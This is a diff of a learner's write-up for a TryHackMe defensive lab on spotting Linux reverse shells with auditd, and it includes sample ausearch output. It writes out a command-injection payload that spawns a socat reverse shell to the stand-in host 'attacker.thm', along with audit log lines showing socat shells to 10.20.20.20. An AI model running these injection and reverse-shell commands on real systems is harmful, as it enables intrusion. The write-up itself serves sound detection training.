@@ -10,6 +10,9 @@ date_completed: 2026-07-03
 ---
 
 *Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*
+<p align="center">
+<img src=screenshots/linux3_intro.png width="1500">
+</p>
 
 ## Task 1: Introduction
 
@@ -32,10 +35,16 @@ Not all Linux attacks are simple SSH brute force or cryptomining. This room cove
 
 Attackers when they breach a system thur SSH they get a visual terminal, which often has autocompletion and Ctrl+C integration.  
 	- Initial Access via exploit or web vulnerability often comes with visual difficulties for the attackers.
+	- Buggy command output, execution delays and timeouts, rate limits, network restrictions and many more.
 
-![](screenshots/linux3_trypingme.png)
+**Example of Attack Limitations**
+<p align="center">
+<img src=screenshots/linux3_attacklimitations.png width="700">
+</p>
 
 ### Reverse Shells
+
+To reduce friction and make the workflow easier attackers will attempt to deploy a reverse shell right away.
 
 Three methods to open a reverse shell on Linux:
 
@@ -49,27 +58,78 @@ Three methods to open a reverse shell on Linux:
 
 ### Detecting Reverse Shells
 
-Reference syntax for tracing reverse shell origin and activity with auditd:
+Reverse shells should be treated as a **high alert** for any SOC. 
+	- Reverse shell means a human has gained access and is actively trying to establish a shell connection to further their attack
+	- Reverse shell is detectable with **auditd**
+
+**Example: Reverse Shell Established via TryPingMe Web Vulnerability**
 
 ```
-ausearch -i -x socat
-ausearch -i --pid <parent_pid>
-ausearch -i --ppid <child_pid> | grep proctitle
+root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree
+type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
+type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe
+type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
+type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
 ```
 
+The reverse shell will connect back to the attackers IP, this is usually followed by **Discovery** commands
+
+**Example: Detecting the Reverse Shell**
+```
+
+root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes
+type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id
+type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a
+type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
+[...]
+
+```
+---
+
+In this task, use the VM to see how TryPingMe vulnerability works in practice:
+    - Access TryPingMe through your browser or AttackBox at http://MACHINE_IP:8000
+    - Access the scenario auditd logs at ausearch -i -if /home/ubuntu/scenario/audit.log
+	
+---
 
 
-**Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?**
+**1. Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?**
+
+<p align="center">
+<img src=screenshots/linux3_trypingme.png width="700">
+</p>
+
 
 **Answer:**
 
-**Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?**
+---
+
+**2. Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?**
+
+<p align="center">
+<img src=screenshots/linux3_revshell.png width="700">
+</p>
+
 
 **Answer:**
 
-**Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?**
+---
+
+**3. Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?**
 
 **Answer:**
+
+---
 
 ## Task 3: Privilege Escalation
 
